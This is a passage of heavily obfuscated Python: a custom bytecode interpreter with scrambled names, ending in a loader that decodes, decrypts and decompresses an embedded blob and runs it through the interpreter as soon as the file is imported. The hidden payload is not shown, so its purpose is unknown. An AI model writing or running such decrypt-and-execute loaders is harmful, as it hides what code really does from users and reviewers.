                return _builtins.super(*args)
              stack.append(_rxzz738lu)
            elif builtins_dict and _n in builtins_dict:
              stack.append(builtins_dict[_n])
            else:
              raise NameError(f"name '{_n}' is not defined")
        elif opcode < 4590:
          if opcode < 4396:
            if opcode < 4200:
              if opcode < 4173:
                if opcode < 4142:
                  if opcode == 4133:
                    _yst0vklg = names[arg]
                    if _yst0vklg in globals_dict:
                      del globals_dict[_yst0vklg]
                    else:
                      raise NameError(f"name '{_yst0vklg}' is not defined")
                elif opcode == 4142:
                  _kk15utd3 = stack.pop(); _vk22ciul = stack.pop(); _ta1c66dr = stack.pop(); _vk22ciul[_kk15utd3] = _ta1c66dr
                elif opcode == 4147:
                  seq = list(stack.pop())
                  if len(seq) != arg:
                    raise ValueError(f'need more than {len(seq)} values to unpack (expected {arg})')
                  for item in reversed(seq):
                    stack.append(item)
              elif opcode < 4180:
                if opcode == 4173:
                  _w9nsdjg2y3 = registers[arg[1]]; _ttoa36ueuc = registers[arg[2]]; registers[arg[0]] = _w9nsdjg2y3 + _ttoa36ueuc
              elif opcode < 4187:
                if opcode == 4180:
                  _b5vw7ij9yt = arg; frame._dt5stgv42 = _b5vw7ij9yt
              elif opcode == 4187:
                stack.extend([frame._y1iycm4x[arg].val])
              elif opcode == 4198:
                _v = fastlocals[arg[1]]; registers[arg[0]] = _v
            elif opcode < 4288:
              if opcode == 4200:
                _n = names[arg]
                if _n in locals_dict:
                  locals_dict.pop(_n)
                else:
                  raise NameError(f"name '{_n}' is not defined")
              elif opcode == 4230:
                _v = stack.pop(); stack.append(not _v)
            elif opcode < 4370:
              if opcode == 4288:
                _d, _s1, _s2 = arg; registers[_d] = registers[_s1] % registers[_s2]
            elif opcode == 4370:
              _d_v2 = None; _d0_c = consts[arg]; registers[0] = _d0_c; _d1_ret = registers[0]; _awdg14bu5 = _d1_ret
              if _dopcpc0xf(_awdg14bu5):
                continue
              return _awdg14bu5
            elif opcode == 4393:
              right = stack.pop(); left = stack.pop(); stack.append(left is right)
          elif opcode < 4470:
            if opcode < 4418:
              if opcode == 4396:
                _dtz4h1sl = stack.pop(); frame._dt5stgv42 = arg if not _dtz4h1sl else frame._dt5stgv42
              elif opcode == 4400:
                stack.append(fastlocals[arg])
            elif opcode < 4427:
              if opcode == 4418:
                _d, _s = arg; registers[_d] = ~registers[_s]
            elif opcode == 4427:
              _d_tmp = None; _t0_1 = stack.pop(); _t0_0 = stack.pop(); _t0_res = _t0_0 != _t0_1; _t1_0 = _t0_res; _t1_res = not _t1_0
              stack.append(_t1_res)
            elif opcode == 4469:
              _b = stack.pop(); _a = stack.pop()
              _res = (_a ^ _b ^ 2 * (_a & _b)) + 2 * ((_a ^ _b) & 2 * (_a & _b)) if type(_a) is int and type(_b) is int else _a + _b
              stack.append(_res)
          elif opcode < 4529:
            if opcode < 4479:
              if opcode == 4470:
                _yfad3wj5z = stack.pop(); stack[-1] = stack[-1] // _yfad3wj5z
            elif opcode == 4479:
              _g2ufcsfhkf = names[arg]; _rnvrh0lu8 = _ek5mhps3g(_g2ufcsfhkf, globals_dict, builtins_dict, frame); stack.append(_rnvrh0lu8)
            elif opcode == 4516:
              if arg == 2:
                upper = stack.pop(); lower = stack.pop(); stack.append(slice(lower, upper))
              elif arg == 3:
                step = stack.pop(); upper = stack.pop(); lower = stack.pop(); stack.append(slice(lower, upper, step))
          elif opcode < 4543:
            if opcode == 4529:
              _dtz4h1sl = stack.pop()
              if bool(_dtz4h1sl) is False:
                frame._dt5stgv42 = arg
            elif opcode == 4538:
              right = stack.pop(); left = stack.pop(); stack.append(left < right)
          elif opcode < 4551:
            if opcode == 4543:
              _fgehxzyibq = stack.pop(); stack.append(iter(_fgehxzyibq))
          elif opcode < 4569:
            if opcode == 4551:
              _nidx, _src = arg; globals_dict[names[_nidx]] = registers[_src]
          elif opcode == 4569:
            _d0_c = consts[0]; registers[0] = _d0_c; _d1_v = registers[0]
            while len(fastlocals) <= 0:
              fastlocals.append(None)
            fastlocals[0] = _d1_v; _n = names[0]
            _d2_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
            stack.append(_d2_0)
          elif opcode == 4580:
            val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].update(val)
        elif opcode < 4847:
          if opcode < 4753:
            if opcode < 4684:
              if opcode < 4671:
                if opcode == 4590:
                  _val = stack.pop(); registers[arg] = _val
              elif opcode == 4671:
                fastlocals.__setitem__(arg, None)
              elif opcode == 4682:
                _agmculbipi, _klqlrecb4 = stack[-2:]; del stack[-2:]; stack.append(_agmculbipi - _klqlrecb4)
            elif opcode < 4693:
              if opcode == 4684:
                stack.extend(stack[-2:])
            elif opcode == 4693:
              _dbo3lf3a = stack.pop(); stack[-1] = stack[-1] ^ _dbo3lf3a
            elif opcode == 4705:
              _i095afv15z = stack.pop(); stack[-1] = stack[-1] // _i095afv15z
          elif opcode < 4780:
            if opcode < 4757:
              if opcode == 4753:
                _src = registers[arg[1]]; registers[arg[0]] = _src
            elif opcode < 4767:
              if opcode == 4757:
                _dst, _idx = arg; registers[_dst] = fastlocals[_idx]
            elif opcode < 4770:
              if opcode == 4767:
                registers[arg[0]].add(registers[arg[1]])
            elif opcode == 4770:
              _r = stack.pop(); stack[-1] = stack[-1] @ _r
            elif opcode == 4773:
              left = fastlocals[arg[0]]; right = consts[arg[1]]; cmp_arg = arg[2]; res = False
              if cmp_arg == 0:
                res = left < right
              elif cmp_arg == 1:
                res = left <= right
              elif cmp_arg == 2:
                res = left == right
              elif cmp_arg == 3:
                res = left != right
              elif cmp_arg == 4:
                res = left > right
              elif cmp_arg == 5:
                res = left >= right
              elif cmp_arg == 6:
                res = left in right
              elif cmp_arg == 7:
                res = left not in right
              elif cmp_arg == 8:
                res = left is right
              elif cmp_arg == 9:
                res = left is not right
              elif cmp_arg == 10:
                res = isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
              stack.append(res)
          elif opcode < 4789:
            if opcode == 4780:
              right = stack.pop(); left = stack.pop(); stack.append(left != right)
          elif opcode == 4789:
            _awdg14bu5 = fastlocals[arg]
            if _dopcpc0xf(_awdg14bu5):
              continue
            return _awdg14bu5
          elif opcode == 4843:
            _awdg14bu5 = stack.pop()
            if _dopcpc0xf(_awdg14bu5):
              continue
            return _awdg14bu5
        elif opcode < 4920:
          if opcode == 4847:
            _o8rkh8quh = frame._y1iycm4x[arg]; setattr(_o8rkh8quh, 'val', stack.pop())
          elif opcode == 4867:
            _val = stack.pop(); registers[arg] = _val
        elif opcode < 4931:
          if opcode == 4920:
            locals_dict[names[arg]] = stack.pop()
        elif opcode < 4961:
          if opcode == 4931:
            _o, _k = arg; del registers[_o][registers[_k]]
          elif opcode == 4934:
            frame._dt5stgv42 += arg - frame._dt5stgv42
        elif opcode == 4961:
          const_idx, var_idx = arg
          while len(fastlocals) <= var_idx:
            fastlocals.append(None)
          fastlocals[var_idx] = consts[const_idx]
        elif opcode == 4980:
          _cdp03gh4 = names[arg]; _jwke5oki7 = locals_dict
          if _cdp03gh4 in _jwke5oki7:
            stack.append(_jwke5oki7[_cdp03gh4])
          elif _cdp03gh4 in globals_dict:
            stack.append(globals_dict[_cdp03gh4])
          elif _cdp03gh4 == 'super':
            def _rxzz738lu(*args):
              if not args:
                if hasattr(frame, '_bndvtbtyk') and frame._bndvtbtyk and hasattr(frame._bndvtbtyk, '__class_owner__') and frame._qgybkgcu:
                  return _builtins.super(frame._bndvtbtyk.__class_owner__, frame._qgybkgcu[0])
              return _builtins.super(*args)
            stack.append(_rxzz738lu)
          elif builtins_dict and _cdp03gh4 in builtins_dict:
            stack.append(builtins_dict[_cdp03gh4])
          else:
            raise NameError(f"name '{_cdp03gh4}' is not defined")
        if frame._cpq05ys9v3 is not None:
          _b3ve3pf26 = frame._cpq05ys9v3; frame._cpq05ys9v3 = None; _nktkxjsx(_b3ve3pf26); continue
      except Exception as exc:
        handled = False
        while True:
          while frame._okdt6esla:
            b = frame._okdt6esla.pop()
            if b.type == _aexdki9e08.WITH:
              del stack[b.stack_height:]; suppress = False
              if b.exit_fn:
                try:
                  suppress = bool(b.exit_fn(type(exc), exc, exc.__traceback__))
                except Exception:
                  suppress = False
              if suppress:
                frame._dt5stgv42 = b.handler_pc; handled = True; break
            elif b.type in (_aexdki9e08.EXCEPT, _aexdki9e08.FINALLY):
              del stack[b.stack_height:]; stack.append(exc); frame._dt5stgv42 = b.handler_pc; handled = True; break
          if handled:
            break
          if _x7a4h3kbu:
            frame = _x7a4h3kbu.pop(); code = frame._ftgmrblsan; instructions = code.instructions; consts = code.consts; names = code.names
            stack = frame._feyojd9f3; registers = frame._e7zhpj0b6y; fastlocals = frame._qgybkgcu; globals_dict = frame._r4sl7vc3
            locals_dict = frame._akri2x87; builtins_dict = globals_dict.get('__builtins__')
            if isinstance(builtins_dict, type(_sys)):
              builtins_dict = builtins_dict.__dict__
            elif hasattr(builtins_dict, '__dict__'):
              builtins_dict = builtins_dict.__dict__
          else:
            break
        if not handled:
          raise
    return None
  finally:
    _x0xokiyl = old_frame
def _pzobodiqo():
  _psn = _d6jmo8mylx(); decrypted = _pxmddtlpv(_b64.b85decode(_dzezf0u7()), _tygu46fyf()); raw = _zlib.decompress(decrypted)
  reader = _gkellgu0h(raw); root_code = _g6kjsw0i(reader); g = globals()
  if '__builtins__' not in g:
    g['__builtins__'] = _builtins
  f = _iti5884lo(root_code, g, locals_dict=g)
  if _psn:
    f._zvyfas1jas ^= _psn
  return _fqn1myr2(f)
_pzobodiqo()
